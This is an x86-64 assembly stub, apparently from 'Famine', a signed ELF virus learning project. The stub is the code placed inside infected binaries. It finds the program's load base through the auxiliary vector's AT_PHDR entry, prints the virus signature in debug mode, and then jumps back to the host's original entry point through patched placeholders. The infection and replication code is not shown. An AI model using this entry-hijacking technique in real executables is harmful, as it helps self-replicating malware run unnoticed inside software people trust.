BITS 64
global stub

%ifndef DEBUG
%define DEBUG 0
%endif

stub:
	mov r15, rdx ; save rdx (rtld_fini) before write syscall clobbers it
	mov rbp, rsp ; save initial RSP for auxv walk

	call .after_sig

.sig:
	db "Famine version 1.0 (c)oded by cbopp-mvan-wij", 10

.after_sig:
	pop rsi
%if DEBUG
	mov rax, 1 ; sys_write
	mov rdi, 1 ; fd = stdout
	mov rdx, .after_sig - .sig ; len
	syscall
%endif

	; get load_base via auxv AT_PHDR
	; initial stack at rbp: [argc][argv][NULL][envp][NULL][auxv]
	mov rax, [rbp] ; argc
	lea rdi, [rbp + rax*8 + 16] ; &envp[0]: skip 8(argc) + argc*8(argv) + 8(NULL)

.skip_envp:
	cmp qword [rdi], 0
	je .envp_done
	add rdi, 8
	jmp .skip_envp
.envp_done:
	add rdi, 8 ; skip NULL -> &auxv[0]

.find_at_phdr:
	mov rax, [rdi]
	test rax, rax ; AT_NULL = 0?
	jz .no_at_phdr
	cmp rax, 3 ; AT_PHDR = 3
	je .got_at_phdr
	add rdi, 16
	jmp .find_at_phdr

.got_at_phdr:
	mov rdi, [rdi + 8] ; rdi = AT_PHDR runtime address
	mov rax, 0xFEEDFACEFEEDFACE ; placeholder: PT_PHDR link-timep p_vaddr
	sub rdi, rax ; load_base = AT_PHDR_runtime - PT_PHDR_link_vaddr
	jmp .have_load_base

.no_at_phdr:
	xor rdi, rdi ; load_base = 0 fallback

.have_load_base:
	mov rbp, rdi ; rbp = load_base (survives all subsequent syscalls)

	mov rdx, r15	;restore rtld_fini
	mov r11, 0xAAAAAAAAAAAAAAAA ; placeholder for e_entry
	add r11, rbp ; + load_base = actual runtime entry
	jmp r11
